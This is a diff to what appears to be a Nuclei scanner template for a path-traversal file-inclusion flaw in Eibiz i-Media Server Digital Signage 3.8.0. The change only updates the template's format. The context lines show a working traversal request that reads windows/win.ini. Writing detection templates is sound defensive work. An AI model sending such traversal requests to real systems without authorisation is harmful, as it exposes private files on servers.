@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: eibiz-lfi
 info:
   name: Eibiz i-Media Server Digital Signage 3.8.0 - Local File Inclusion
@@ -11,7 +12,7 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   tags: windows,lfi,eibiz
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/dlibrary/null?oldfile=../../../../../../windows/win.ini&library=null"
